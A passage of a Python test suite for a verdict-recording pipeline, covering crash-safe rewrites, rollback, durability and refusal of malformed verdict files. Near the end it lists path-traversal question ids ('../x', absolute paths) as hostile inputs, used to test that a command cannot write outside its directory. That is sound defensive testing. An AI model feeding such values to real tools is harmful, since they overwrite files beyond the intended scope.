    cli.remap(data=tmp_path, apply=True, archive_stranded=True)

    assert judgments.load(tmp_path, "q3")[shared.sid].note == "judged for q4"
    assert not judgments.path_for(tmp_path, "q4").exists()
    (kept,) = judgments.archive_dir(tmp_path).iterdir()
    assert json.loads((kept / "q3.json").read_text())[0]["note"] == "judged for the stranded q3"
    assert (tmp_path / "claims-archive" / "q3.json").exists()


def _swapped_run(tmp_path):
    """Two claims trade ids, plus a lapsed verdict to archive. No order of per-shard writes is
    safe here: each shard gains exactly what the other loses."""
    from vgpipe import judgments

    a, b = src(**ONLY_A), src(**ONLY_B)
    judgments.record(tmp_path, "q1", a.sid, "supports", "a")
    judgments.record(tmp_path, "q1", "deadbeef1234", "supports", "lapsed")
    judgments.record(tmp_path, "q2", b.sid, "topic_only", "b")
    claims = [Claim(question_id="q2", question="?", answer="a", sources=[a]),
              Claim(question_id="q1", question="?", answer="b", sources=[b])]
    return claims, {"q1": "q2", "q2": "q1"}


def _fail_write(monkeypatch, into="judgments", nth=2):
    """Fail the nth write into a directory named `into` (or a run directory inside it), like a
    full disk arriving partway through."""
    from vgpipe import judgments

    real, calls = judgments._write, []

    def flaky(p, items):
        if into in (p.parent.name, p.parent.parent.name):
            calls.append(p)
            if len(calls) == nth:
                raise OSError(28, "No space left on device")
        real(p, items)

    monkeypatch.setattr(judgments, "_write", flaky)
    return calls


@pytest.mark.parametrize("into, nth", [
    pytest.param("judgments", 2, id="second-shard"),
    # the archive is the last write, after every shard already holds its new contents
    pytest.param("judgments-archive", 1, id="archive"),
])
def test_a_rehome_that_fails_midway_puts_every_shard_back(tmp_path, monkeypatch, into, nth):
    """rehome() unlinked every shard and then wrote the new ones, so a full disk or a
    permission error between the two lost every verdict already unlinked — and nothing could
    recover them: remap backs up claims/, not judgments/."""
    from vgpipe import judgments

    claims, moved = _swapped_run(tmp_path)
    before = _shards(tmp_path)
    calls = _fail_write(monkeypatch, into, nth)
    with pytest.raises(OSError, match="No space left"):
        judgments.rehome(tmp_path, claims, moved=moved)
    assert len(calls) == nth, "the writes before it really happened"
    assert _shards(tmp_path) == before
    assert not judgments.backup_dir(tmp_path).exists()
    archive = judgments.archive_dir(tmp_path)
    assert not archive.exists() or not any(archive.iterdir()), \
        "the lapsed verdict is back in its shard, so an archive of it would be archived twice"

    monkeypatch.undo()
    assert judgments.rehome(tmp_path, claims, moved=moved) == (2, 1, ["q1", "q2"], 2)


@pytest.mark.parametrize("dies", [
    pytest.param("mid-shard-write", id="mid-rewrite"),
    # every shard and the archive written, only the commit left: restoring must also take back
    # the archive, or re-running archives the same verdicts a second time
    pytest.param("before-commit", id="after-archive"),
])
def test_a_rehome_that_dies_midway_leaves_a_backup_every_reader_stops_on(tmp_path, monkeypatch,
                                                                        capsys, dies):
    """A process that dies mid-rewrite cannot restore anything. The backup then holds every
    shard, and its presence has to stop readers: shards half-rewritten would otherwise render
    whatever they are missing as unreviewed — the silent loss the backup exists to prevent. And
    recovery is a command, not a procedure: the hand-written one told the operator to remove
    shards the backup lacked, which a partial backup would have turned into a delete."""
    from vgpipe import cli, judgments

    claims, moved = _swapped_run(tmp_path)
    before = _shards(tmp_path)
    then = None
    if dies == "mid-shard-write":
        _fail_write(monkeypatch)
    else:
        def then():
            raise KeyboardInterrupt

    def die(*a):
        raise KeyboardInterrupt

    monkeypatch.setattr(judgments, "_restore", die)
    with pytest.raises(KeyboardInterrupt):
        judgments.rehome(tmp_path, claims, moved=moved, then=then)
    monkeypatch.undo()

    backup = judgments.backup_dir(tmp_path)
    assert {p.name: p.read_bytes() for p in sorted(backup.glob("*.json"))} == before
    assert _shards(tmp_path) != before, "the rewrite really was under way"
    for read in (lambda: judgments.load(tmp_path, "q1"),
                 lambda: judgments.load_every(tmp_path),
                 lambda: judgments.record(tmp_path, "q1", src().sid, "supports"),
                 lambda: judgments.rehome(tmp_path, claims, moved=moved)):
        with pytest.raises(judgments.UnreadableJudgments, match="vg judgments --rollback"):
            read()

    cli.show_judgments(data=tmp_path, rollback=True)
    assert "put back 2 shard(s)" in re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out)
    assert _shards(tmp_path) == before
    assert not backup.exists()
    archive = judgments.archive_dir(tmp_path)
    assert not archive.exists() or not any(archive.iterdir()), "the begun archive is undone"
    assert judgments.rehome(tmp_path, claims, moved=moved) == (2, 1, ["q1", "q2"], 2)
    assert len(list(archive.iterdir())) == 1, "one archive of the lapsed verdict, not two"


def _every_verdict(root: Path) -> set[tuple[str, str]]:
    """Every verdict on disk, live or archived, as (sid, note)."""
    from vgpipe import judgments

    live = {(sid, j.note) for shard in judgments.load_every(root).values()
            for sid, j in shard.items()}
    archive = judgments.archive_dir(root)
    kept = {(e["sid"], e["note"]) for p in archive.rglob("*.json")
            for e in json.loads(p.read_text())} if archive.exists() else set()
    return live | kept


def _killed_while_removing(monkeypatch, root: Path):
    """rmtree that dies partway through a backup directory, like a process killed mid-delete.
    Deletes one shard first, so what is left is exactly what a partial delete leaves."""
    from vgpipe import judgments

    real = judgments.shutil.rmtree

    def partway(path, *a, **kw):
        path = Path(path)
        if path.name.startswith("judgments-backup") and path.exists():
            next(iter(sorted(path.glob("*.json")))).unlink()
            raise KeyboardInterrupt
        real(path, *a, **kw)

    monkeypatch.setattr(judgments.shutil, "rmtree", partway)


@pytest.mark.parametrize("during", ["commit", "rollback"])
def test_a_kill_while_the_backup_is_removed_loses_nothing(tmp_path, monkeypatch, during):
    """Removing the backup IS the commit, and rmtree is not atomic. Killed partway, it left a
    backup missing some shards; every reader pointed at --rollback, and the rollback trusted it —
    restoring what remained, unlinking every shard it lacked, and removing the archive. Reproduced
    on this run: 1 of 3 verdicts left. Rollback's own clean-up had the same flaw."""
    from vgpipe import judgments

    claims, moved = _swapped_run(tmp_path)
    everything = _every_verdict(tmp_path)
    assert len(everything) == 3
    if during == "rollback":
        # an interrupted re-home to roll back: it dies just before committing
        def then():
            raise KeyboardInterrupt

        monkeypatch.setattr(judgments, "_restore", lambda *a: (_ for _ in ()).throw(
            KeyboardInterrupt()))
        with pytest.raises(KeyboardInterrupt):
            judgments.rehome(tmp_path, claims, moved=moved, then=then)
        monkeypatch.undo()
    _killed_while_removing(monkeypatch, tmp_path)
    with pytest.raises(KeyboardInterrupt):
        if during == "commit":
            judgments.rehome(tmp_path, claims, moved=moved)
        else:
            judgments.rollback(tmp_path)
    monkeypatch.undo()

    # recover exactly as the pipeline says to
    try:
        judgments.load_every(tmp_path)
    except judgments.UnreadableJudgments:
        judgments.rollback(tmp_path)
    assert _every_verdict(tmp_path) == everything


def test_a_remap_interrupted_moving_claims_puts_the_claims_back_too(tmp_path, monkeypatch):
    """Rolling back only the shards reverted the verdicts under claims that had already moved:
    old q18's claim, now at q20, rendered old q20's verdicts — the old false green, back. The
    claim moves are part of the transaction, so undoing it undoes them."""
    from vgpipe import cli, judgments

    _renumbered_run(tmp_path)
    claims_before = {p.name: p.read_bytes() for p in (tmp_path / "claims").iterdir()}
    shards_before = _shards(tmp_path)
    real = Path.write_text

    def ctrl_c(self, *a, **kw):
        if self.parent.name == "claims" and self.name == "q22.json":
            raise KeyboardInterrupt      # q20.json was already written
        return real(self, *a, **kw)

    monkeypatch.setattr(Path, "write_text", ctrl_c)
    with pytest.raises(KeyboardInterrupt):
        cli.remap(data=tmp_path, apply=True)
    monkeypatch.undo()
    assert {p.name: p.read_bytes() for p in (tmp_path / "claims").iterdir()} == claims_before
    assert _shards(tmp_path) == shards_before
    assert not judgments.backup_dir(tmp_path).exists()


def test_every_file_a_remap_writes_is_on_disk_before_the_commit(tmp_path, monkeypatch):
    """The commit is the rename that drops the backup, and after it nothing can put the moved
    claims back. Their directories were made durable but the files were not, so a power loss
    after the commit could keep the marker's name without its new line: claims moved with no
    marker, which a later remap re-applies."""
    import os

    from vgpipe import cli, judgments

    _renumbered_run(tmp_path)
    events: list[tuple[str, int]] = []
    real_fsync, real_replace = os.fsync, judgments.os.replace

    def fsync(fd):
        events.append(("fsync", os.fstat(fd).st_ino))
        real_fsync(fd)

    def replace(a, b):
        if Path(b).name == "judgments-backup.discard":
            events.append(("commit", 0))
        real_replace(a, b)

    monkeypatch.setattr(os, "fsync", fsync)
    monkeypatch.setattr(judgments.os, "replace", replace)
    cli.remap(data=tmp_path, apply=True)

    commit = events.index(("commit", 0))
    durable = {ino for kind, ino in events[:commit] if kind == "fsync"}
    written = [tmp_path / "claims" / "q20.json", tmp_path / "claims" / "q22.json",
               tmp_path / ".remap-applied"]
    assert {p.name for p in written if p.stat().st_ino not in durable} == set()


def test_a_remap_killed_after_its_claims_moved_rolls_back_claims_and_verdicts(tmp_path,
                                                                              monkeypatch):
    """Killed after the claims moved but before the commit, the backup is whole — and rolling
    back only its shards put the verdicts on their old ids under claims on their new ones."""
    from vgpipe import cli, judgments

    _renumbered_run(tmp_path)
    claims_before = {p.name: p.read_bytes() for p in (tmp_path / "claims").iterdir()}
    shards_before = _shards(tmp_path)
    real_replace = judgments.os.replace

    def killed_at_commit(a, b):
        if Path(b).name == "judgments-backup.discard":
            raise KeyboardInterrupt
        real_replace(a, b)

    monkeypatch.setattr(judgments.os, "replace", killed_at_commit)
    with pytest.raises(KeyboardInterrupt):
        cli.remap(data=tmp_path, apply=True)
    monkeypatch.undo()
    assert (tmp_path / "claims" / "q22.json").exists(), "the claims really had moved"
    with pytest.raises(judgments.UnreadableJudgments, match="vg judgments --rollback"):
        judgments.load(tmp_path, "q20")

    cli.show_judgments(data=tmp_path, rollback=True)
    assert {p.name: p.read_bytes() for p in (tmp_path / "claims").iterdir()} == claims_before
    assert _shards(tmp_path) == shards_before
    cli.remap(data=tmp_path, apply=True)
    assert judgments.load(tmp_path, "q20")[src(**SHARED).sid].note == "judged for old q18"


def test_a_rehome_that_dies_building_its_backup_has_touched_nothing(tmp_path, monkeypatch):
    """The backup is what recovery restores from, so it must be whole or absent: one that died
    half-copied, read as the truth, would drop every shard it had not reached yet."""
    from vgpipe import judgments

    claims, moved = _swapped_run(tmp_path)
    before = _shards(tmp_path)
    real, calls = judgments._copy, []

    def dies_on_second(src, dst):
        calls.append(dst)
        if len(calls) == 2:
            raise KeyboardInterrupt
        real(src, dst)

    monkeypatch.setattr(judgments, "_copy", dies_on_second)
    # a process that is killed runs no cleanup either
    monkeypatch.setattr(judgments.shutil, "rmtree", lambda *a, **kw: None)
    with pytest.raises(KeyboardInterrupt):
        judgments.rehome(tmp_path, claims, moved=moved)
    monkeypatch.undo()

    assert (tmp_path / "judgments-backup.partial").exists(), "the half-built backup is left"
    assert _shards(tmp_path) == before
    assert not judgments.backup_dir(tmp_path).exists()
    assert set(judgments.load_every(tmp_path)) == {"q1", "q2"}, "readers are not stopped"
    assert judgments.rehome(tmp_path, claims, moved=moved) == (2, 1, ["q1", "q2"], 2)
    assert not (tmp_path / "judgments-backup.partial").exists()


def test_a_verdict_recorded_during_a_rehome_is_not_lost(tmp_path, monkeypatch):
    """rehome() read every shard, then rewrote them. A `vg judge` landing in between was never
    read, so the rewrite deleted it — and verifier agents record verdicts while other commands
    run. It must wait for the rewrite and then land on top of it."""
    import threading

    from vgpipe import judgments

    s1, s2, s3 = src(), src(**ONLY_B), src(**SHARED)
    judgments.record(tmp_path, "q21", s1.sid, "supports", "moves with its claim")
    judgments.record(tmp_path, "q18", s2.sid, "supports", "already home")
    claims = [Claim(question_id="q18", question="?", answer="a", sources=[s1, s2, s3])]

    real_plan, verifier = judgments._plan, []

    def plan_then_judge(*a):
        planned = real_plan(*a)
        t = threading.Thread(
            target=judgments.record, args=(tmp_path, "q18", s3.sid, "topic_only", "mid-rehome"))
        t.start()
        t.join(timeout=0.3)
        verifier.append(t)
        assert t.is_alive(), "the verdict was written while rehome() held stale shards"
        return planned

    monkeypatch.setattr(judgments, "_plan", plan_then_judge)
    judgments.rehome(tmp_path, claims, {"q21": "q18", "q18": "q18"})
    verifier[0].join(timeout=5)
    assert not verifier[0].is_alive()
    assert {sid: j.note for sid, j in judgments.load(tmp_path, "q18").items()} == {
        s2.sid: "already home", s1.sid: "moves with its claim", s3.sid: "mid-rehome"}


# A hand-repaired verdict file, reshaped into a dict keyed by sid: valid JSON, wrong shape.
DICT_SHAPED = b'{"abc123def456": {"sid": "abc123def456", "verdict": "supports"}}'
UNREADABLE_JUDGMENTS = [
    pytest.param(b'[{"sid": "abc123def456", "verdict": "supp', id="truncated-json"),
    pytest.param(DICT_SHAPED, id="dict-shaped"),
    pytest.param(b"null", id="json-null"),
    pytest.param(b"\xff\xfe not utf-8", id="not-utf8"),
]

# A shard whose list parses but whose entry 1 does not read as a verdict. Entry 0 is fine.
READABLE_ENTRY = {"sid": "0123456789ab", "verdict": "supports", "note": "readable"}


def _shard_with(*bad) -> bytes:
    return json.dumps([READABLE_ENTRY, *bad], indent=1).encode()


TYPOED_KEY = _shard_with({"sid": "abc123def456", "verdit": "supports"})
UNREADABLE_ENTRIES = [
    pytest.param(_shard_with("abc123def456"), id="entry-not-a-mapping"),
    pytest.param(TYPOED_KEY, id="entry-typoed-key"),
    pytest.param(_shard_with({"sid": "abc123def456", "verdict": "supports", "confidence": "high"}),
                 id="entry-unknown-key"),
    pytest.param(_shard_with({"verdict": "supports", "note": "whose?"}), id="entry-missing-sid"),
    pytest.param(_shard_with({"sid": "abc123def456", "verdict": "support"}),
                 id="entry-unrecognized-verdict"),
    pytest.param(_shard_with({"sid": 12345, "verdict": "supports"}), id="entry-non-string-sid"),
    pytest.param(_shard_with({"sid": "", "verdict": "supports"}), id="entry-empty-sid"),
    # it could never match a cited source, so it would read as lapsed and rehome() would drop it
    pytest.param(_shard_with({"sid": "abc123def456 ", "verdict": "contradicts"}),
                 id="entry-padded-sid"),
    pytest.param(_shard_with({**READABLE_ENTRY, "verdict": "contradicts"}),
                 id="entry-duplicate-sid"),
    # json.loads keeps the last of two equal keys, so one verdict would vanish unread
    pytest.param(_shard_with()[:-2] + b', {"sid": "abc123def456", "verdict": "supports", '
                                      b'"verdict": "contradicts"}]', id="entry-repeated-key"),
    # these used to load and then crash `vg judgments` or is_stale() with a traceback
    pytest.param(_shard_with({"sid": "abc123def456", "verdict": "supports", "note": 7}),
                 id="entry-numeric-note"),
    pytest.param(_shard_with({"sid": "abc123def456", "verdict": "supports",
                              "extractor_version": "3"}), id="entry-string-extractor-version"),
    # NaN compares False with everything, so this verdict could never go stale
    pytest.param(_shard_with({"sid": "abc123def456", "verdict": "supports",
                              "extractor_version": float("nan")}), id="entry-nan-extractor-version"),
    # JSON true is an int to isinstance(), and would compare as extractor version 1
    pytest.param(_shard_with({"sid": "abc123def456", "verdict": "supports",
                              "extractor_version": True}), id="entry-bool-extractor-version"),
]


@pytest.mark.parametrize("body", UNREADABLE_JUDGMENTS)
def test_an_unreadable_judgments_file_is_an_error_not_unreviewed(tmp_path, body):
    """load() returned {} for a file it could not parse, and iterated nothing for one that
    parsed to a non-list. A hand-repaired, dict-shaped shard from a live run therefore
    vanished: every source in it read as unreviewed, which says "nobody judged this" when the
    truth is "the verdicts are unreadable"."""
    from vgpipe import judgments

    p = judgments.path_for(tmp_path, "q1")
    p.parent.mkdir(parents=True)
    p.write_bytes(body)
    with pytest.raises(ValueError, match=re.escape(str(p))) as exc:
        judgments.load(tmp_path, "q1")
    # It must say what to do next — and never offer deletion: a dict-shaped shard still holds
    # real verdicts, and verifier agents (which have Bash) act on what this message tells them.
    msg = str(exc.value)
    assert "repair" in msg or "rewrite" in msg, "the message must say what the operator does next"
    assert "Do not delete it" in msg


@pytest.mark.parametrize("body", UNREADABLE_ENTRIES)
def test_an_unreadable_verdict_entry_is_an_error_not_unreviewed(tmp_path, body):
    """Refusing a whole unreadable file left the same bug one level down: load() skipped any
    single entry it could not read — a typo'd key, a verdict outside VERDICTS, a second verdict
    for one source — without a word, and every source it judged read as unreviewed."""
    from vgpipe import judgments

    p = judgments.path_for(tmp_path, "q1")
    p.parent.mkdir(parents=True)
    p.write_bytes(body)
    with pytest.raises(judgments.UnreadableJudgments, match=re.escape(str(p))) as exc:
        judgments.load(tmp_path, "q1")
    msg = str(exc.value)
    assert "entry 1" in msg, "name the entry, not just the file"
    assert "entry 0" not in msg, "the readable entry is not the problem"
    assert "fix" in msg, "the message must say what the operator does next"


def test_every_unreadable_entry_is_named_at_once(tmp_path):
    """One refusal per bad entry would make repairing a shard a loop of re-runs."""
    from vgpipe import judgments

    p = judgments.path_for(tmp_path, "q1")
    p.parent.mkdir(parents=True)
    p.write_bytes(json.dumps([{"sid": "a" * 12, "verdit": "supports"}, READABLE_ENTRY,
                              {"sid": "", "verdict": "support"},
                              # readable on its own, but repeats entry 0's sid
                              {"sid": "a" * 12, "verdict": "supports"},
                              *[{"sid": f"{n:012d}", "verdict": "nope"} for n in range(6)]]).encode())
    with pytest.raises(judgments.UnreadableJudgments) as exc:
        judgments.load(tmp_path, "q1")
    msg = str(exc.value)
    assert "entry 1" not in msg
    assert "'verdit' and missing 'verdict'" in msg, "a typo reads as one mistake"
    assert "entry 2: sid '' is not a source id (12 lowercase hex characters) and verdict " \
           "'support'" in msg, "every problem with an entry, not the first"
    assert "entry 3 (sid aaaaaaaaaaaa): a second verdict" in msg, \
        "a repeat of an unreadable entry's sid is still a repeat — or fixing entry 0 reveals it"
    assert all(f"entry {i}" in msg for i in range(4, 10)), "no 'and N more' to re-run for"


@pytest.mark.parametrize("bad", [pytest.param("", id="empty-sid"),
                                 pytest.param(7, id="numeric-note")])
def test_record_will_not_write_a_verdict_load_would_refuse(tmp_path, bad):
    """`vg judge q1 "" supports` wrote an entry the reader refuses, which would stop every
    command that reads the shard until someone repaired it by hand. The writer holds itself to
    the reader's rule."""
    from vgpipe import judgments

    judgments.record(tmp_path, "q1", "0123456789ab", "supports", "fine")
    p = judgments.path_for(tmp_path, "q1")
    before = p.read_bytes()
    sid, note = ("", "n") if bad == "" else ("abc123def456", bad)
    with pytest.raises(ValueError, match="could not be read back"):
        judgments.record(tmp_path, "q1", sid, "supports", note)
    assert p.read_bytes() == before
    assert list(judgments.load(tmp_path, "q1")) == ["0123456789ab"]


@pytest.mark.parametrize("run", [
    pytest.param(lambda cli, d, s: cli.show_judgments(data=d), id="judgments"),
    # a sid the claim cites, or judge refuses it before ever reading the shard
    pytest.param(lambda cli, d, s: cli.judge("q1", s.sid, "supports", data=d), id="judge"),
])
def test_a_refusal_prints_the_bad_value_as_written(tmp_path, capsys, run):
    """The refusal quotes the file's own text, and rich reads brackets as markup: a verdict of
    "[/]" crashed the refusal into a traceback, and "[supports]" vanished from it — hiding the
    very value the operator has to fix."""
    import typer

    from vgpipe import cli

    s, p = _run_with_unreadable_judgments(
        tmp_path, _shard_with({"sid": "abc123def456", "verdict": "[/]"},
                              {"sid": "def456abc123", "verdict": "[supports]"}))
    with pytest.raises(typer.Exit):
        run(cli, tmp_path, s)
    out = re.sub(r"\x1b\[[0-9;]*m", "", "".join(capsys.readouterr().out.splitlines()))
    assert "'[/]'" in out and "'[supports]'" in out   # no spaces: rich wraps at them


@pytest.mark.parametrize("body", UNREADABLE_JUDGMENTS + UNREADABLE_ENTRIES)
def test_recording_into_an_unreadable_judgments_file_leaves_it_untouched(tmp_path, body):
    """record() loads, adds one verdict, and rewrites the file — so reading a malformed file as
    empty replaced every verdict in it with the single new one."""
    from vgpipe import judgments

    p = judgments.path_for(tmp_path, "q1")
    p.parent.mkdir(parents=True)
    p.write_bytes(body)
    with pytest.raises(ValueError, match=re.escape(str(p))):
        judgments.record(tmp_path, "q1", src().sid, "supports", "new verdict")
    assert p.read_bytes() == body, "the file must be byte-identical after the refusal"


@pytest.mark.parametrize("body", UNREADABLE_JUDGMENTS + UNREADABLE_ENTRIES)
def test_rehoming_past_an_unreadable_shard_touches_no_shard(tmp_path, body):
    """rehome() pools every shard, unlinks every shard, and rewrites only what it pooled. A
    malformed shard pooled as empty was deleted outright — the verdicts in it gone, not
    merely hidden. It must refuse while every shard is still on disk."""
    from vgpipe import judgments

    s1, s2 = src(), src(url="https://sacbee.com/b", publisher="Sacramento Bee")
    judgments.record(tmp_path, "q1", s1.sid, "supports", "fine")
    judgments.record(tmp_path, "q2", s2.sid, "topic_only", "also fine")
    bad = judgments.path_for(tmp_path, "q3")
    bad.write_bytes(body)
    d = tmp_path / "judgments"
    before = {p.name: p.read_bytes() for p in d.iterdir()}

    moved = Claim(question_id="q9", question="?", answer="a", sources=[s1, s2])
    with pytest.raises(ValueError, match=re.escape(str(bad))):
        judgments.rehome(tmp_path, [moved])
    assert {p.name: p.read_bytes() for p in d.iterdir()} == before


def _run_with_unreadable_judgments(tmp_path, body):
    """A run whose q1 verdict file is unreadable, with the claim it judges on disk, plus a
    claim nothing in the template maps to — so remap has a stranded file it could archive."""
    import json

    from vgpipe import judgments

    s = src()
    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[s]).model_dump_json())
    (tmp_path / "claims" / "q7.json").write_text(
        Claim(question_id="q7", question="dropped", answer="b").model_dump_json())
    (tmp_path / "questions.json").write_text(json.dumps(
        [{"id": "q2", "text": "renumbered", "claim_type": "mechanical", "maps_from": "q1"}]))
    p = judgments.path_for(tmp_path, "q1")
    p.parent.mkdir(parents=True)
    p.write_bytes(body)
    return s, p


CLI_JUDGMENT_READERS = [
    pytest.param(lambda cli, d, s: cli.judge("q1", s.sid, "supports", data=d), id="judge"),
    pytest.param(lambda cli, d, s: cli.show_judgments(data=d), id="judgments"),
    pytest.param(lambda cli, d, s: cli.show_judgments(data=d, repair=True), id="judgments-repair"),
    pytest.param(lambda cli, d, s: cli.verify(data=d), id="verify"),
    pytest.param(lambda cli, d, s: cli.build(data=d), id="build"),
    pytest.param(lambda cli, d, s: cli.status(data=d), id="status"),
    pytest.param(lambda cli, d, s: cli.remap(data=d), id="remap-dry-run"),
    pytest.param(lambda cli, d, s: cli.remap(data=d, apply=True), id="remap"),
    pytest.param(lambda cli, d, s: cli.remap(data=d, apply=True, archive_stranded=True),
                 id="remap-archive-stranded"),
]


@pytest.mark.parametrize("body", [pytest.param(DICT_SHAPED, id="dict-shaped"),
                                  pytest.param(TYPOED_KEY, id="entry-typoed-key")])
@pytest.mark.parametrize("run", CLI_JUDGMENT_READERS)
def test_every_command_that_reads_verdicts_names_an_unreadable_file_and_stops(
        tmp_path, capsys, monkeypatch, run, body):
    """The error has to reach the operator as a readable refusal naming the file — not a
    traceback, and not a run that carries on as though the verdicts did not exist."""
    import typer

    from vgpipe import cli

    def no_fetch(*a, **kw):
        raise AssertionError("must refuse before fetching anything")

    monkeypatch.setattr("vgpipe.verify.fetch", no_fetch)
    s, p = _run_with_unreadable_judgments(tmp_path, body)
    claims_before = {f.name: f.read_bytes() for f in (tmp_path / "claims").iterdir()}
    with pytest.raises(typer.Exit) as exc:
        run(cli, tmp_path, s)
    assert exc.value.exit_code == 1
    # rich wraps a long path across lines, and styles its segments when FORCE_COLOR is set
    out = re.sub(r"\x1b\[[0-9;]*m", "", "".join(capsys.readouterr().out.splitlines()))
    assert str(p) in out, "the refusal must name the file to fix"
    assert p.read_bytes() == body
    # remap reads verdicts only to re-home them after moving claims — so it must refuse
    # before moving anything, or the claims land on new ids with their verdicts left behind
    assert {f.name: f.read_bytes() for f in (tmp_path / "claims").iterdir()} == claims_before
    assert not (tmp_path / "claims-backup").exists()
    assert not (tmp_path / "claims-archive").exists()


def test_verify_reads_every_verdict_file_before_fetching_anything(tmp_path, monkeypatch):
    """verify applies verdicts claim by claim, fetching as it goes — so a malformed shard for
    a LATER claim used to stop the run only after the earlier claims' pages were fetched: a
    long run's network time spent on a run that was always going to refuse."""
    import typer

    from vgpipe import cli, judgments

    (tmp_path / "claims").mkdir()
    for qid, s in (("q1", src()), ("q2", src(url="https://sacbee.com/b"))):
        (tmp_path / "claims" / f"{qid}.json").write_text(
            Claim(question_id=qid, question="?", answer="a", sources=[s]).model_dump_json())
    bad = judgments.path_for(tmp_path, "q2")
    bad.parent.mkdir(parents=True)
    bad.write_bytes(DICT_SHAPED)

    def no_fetch(*a, **kw):
        raise AssertionError("q1's page was fetched before q2's verdicts were read")

    monkeypatch.setattr("vgpipe.verify.fetch", no_fetch)
    with pytest.raises(typer.Exit) as exc:
        cli.verify(data=tmp_path)
    assert exc.value.exit_code == 1


@pytest.fixture
def unsearchable_judgments(tmp_path):
    """A run whose judgments/ directory exists but cannot be listed or entered."""
    import os

    from vgpipe import judgments

    if os.geteuid() == 0:
        pytest.skip("root ignores directory permissions")
    judgments.record(tmp_path, "q1", src().sid, "supports", "unreachable")
    d = tmp_path / "judgments"
    d.chmod(0o000)
    yield d
    d.chmod(0o755)


def test_a_verdict_file_behind_a_permission_error_is_unreadable_not_absent(
        tmp_path, unsearchable_judgments):
    """load() asked `exists()` before its try block. On 3.12 a permission error there escaped
    as a traceback; on 3.13+ `exists()` swallows it and returns False, which reads the shard
    as absent — "nobody judged this" again. Only a file that is really not there is empty."""
    from vgpipe import judgments

    with pytest.raises(ValueError, match=re.escape(str(judgments.path_for(tmp_path, "q1")))):
        judgments.load(tmp_path, "q1")


def test_an_unlistable_judgments_directory_is_unreadable_not_empty(
        tmp_path, unsearchable_judgments):
    """pathlib's glob ignores a directory it cannot list, so load_every() — whose promise is
    that it has read every shard — returned {} for a directory full of verdicts."""
    from vgpipe import judgments

    with pytest.raises(ValueError, match=re.escape(str(unsearchable_judgments))):
        judgments.load_every(tmp_path)


def test_a_writer_that_cannot_lock_the_judgments_directory_refuses(
        tmp_path, unsearchable_judgments):
    """The writers lock the directory before reading it. Opening it for the lock is the first
    thing to meet a permission error, and it must name the directory rather than escape as a
    traceback — or, as an `is_dir()` check would on 3.13+, quietly skip the lock and write."""
    from vgpipe import judgments

    claim = Claim(question_id="q2", question="?", answer="a", sources=[src()])
    for write in (lambda: judgments.record(tmp_path, "q1", src().sid, "topic_only"),
                  lambda: judgments.rehome(tmp_path, [claim])):
        with pytest.raises(judgments.UnreadableJudgments,
                           match=re.escape(str(unsearchable_judgments))):
            write()

    # Writable and enterable but not readable: the shard itself can still be read and replaced
    # by name, so only the lock stands between record() and an unlocked write.
    unsearchable_judgments.chmod(0o300)
    shard = judgments.path_for(tmp_path, "q1")
    before = shard.read_bytes()
    with pytest.raises(judgments.UnreadableJudgments,
                       match=re.escape(f"{unsearchable_judgments} cannot be locked")):
        judgments.record(tmp_path, "q1", src().sid, "topic_only")
    assert shard.read_bytes() == before


def test_rehome_refuses_a_judgments_directory_it_cannot_reach(tmp_path):
    """rehome() asked `exists()` before load_every(). With the run directory unsearchable that
    raised a bare PermissionError on 3.12, and on 3.13+ read as "no judgments" — re-homing
    nothing and reporting success, while every moved claim lost its verdicts."""
    import os

    from vgpipe import judgments

    if os.geteuid() == 0:
        pytest.skip("root ignores directory permissions")
    run = tmp_path / "run"
    judgments.record(run, "q1", src().sid, "supports", "unreachable")
    run.chmod(0o000)
    try:
        with pytest.raises(ValueError, match=re.escape(str(run / "judgments"))):
            judgments.rehome(run, [])
    finally:
        run.chmod(0o755)

def _interrupt_writes(monkeypatch):
    """Fail every shard write after its data is written and before it lands, like a full disk
    at flush time. An in-place write never reaches this point, so it would already have
    replaced the shard."""
    def full_disk(fd):
        raise OSError("No space left on device")

    monkeypatch.setattr("vgpipe.judgments.os.fsync", full_disk)


def test_an_interrupted_verdict_write_leaves_the_shard_whole(tmp_path, monkeypatch):
    """record() wrote the shard in place, so a write that died halfway left a truncated file.
    That used to read as empty; now it refuses every command until someone repairs it — and a
    background `vg judge` can be mid-write while `vg build` reads. A shard must only ever be
    replaced whole."""
    from vgpipe import judgments

    s1, s2 = src(), src(url="https://sacbee.com/b")
    judgments.record(tmp_path, "q1", s1.sid, "supports", "kept")
    p = judgments.path_for(tmp_path, "q1")
    before = p.read_bytes()

    _interrupt_writes(monkeypatch)
    with pytest.raises(OSError):
        judgments.record(tmp_path, "q1", s2.sid, "topic_only", "lost to a full disk")
    monkeypatch.undo()

    assert p.read_bytes() == before
    assert list(judgments.load(tmp_path, "q1")) == [s1.sid]
    assert [f.name for f in p.parent.iterdir()] == ["q1.json"], "no temp file left behind"


def test_a_verdict_write_is_on_disk_before_it_replaces_the_shard(tmp_path, monkeypatch):
    """The rename is atomic, but without an fsync first a power loss can keep the rename and
    lose the data — an empty shard, which every command now refuses rather than reading as
    empty."""
    import os

    from vgpipe import judgments

    order: list[str] = []
    real_replace = os.replace
    monkeypatch.setattr("vgpipe.judgments.os.fsync", lambda fd: order.append("fsync"))
    monkeypatch.setattr("vgpipe.judgments.os.replace",
                        lambda a, b: (order.append("replace"), real_replace(a, b)))
    judgments.record(tmp_path, "q1", src().sid, "supports", "durable")
    assert order == ["fsync", "replace"]


# `vg judge` takes its question id from the command line, and verifier agents have Bash.
ESCAPING_QUESTION_IDS = [
    pytest.param(lambda root: "../x", id="parent"),
    pytest.param(lambda root: "../../elsewhere", id="grandparent"),
    pytest.param(lambda root: "sub/q1", id="separator"),
    # pathlib drops everything before an absolute component: root / "judgments" / "/x.json"
    # is /x.json.
    pytest.param(lambda root: str(root.parent / "outside" / "q1"), id="absolute"),
    pytest.param(lambda root: "../[/x]", id="rich-markup"),
]


def _tree(root):
    return {p: (p.read_bytes() if p.is_file() else None) for p in root.rglob("*")}


@pytest.mark.parametrize("escaping", ESCAPING_QUESTION_IDS)
def test_a_question_id_cannot_reach_outside_the_judgments_directory(tmp_path, escaping):
    """path_for() joined the id straight onto judgments/, and record() then created parent
    directories and replaced whatever was there. The claim schema constrains question ids, but
    `vg judge` never passes through the schema, so `../claims/q7` rewrote a claim file."""
    from vgpipe import judgments

    run = tmp_path / "run"
    judgments.record(run, "q1", src().sid, "supports", "already here")
    qid = escaping(run)
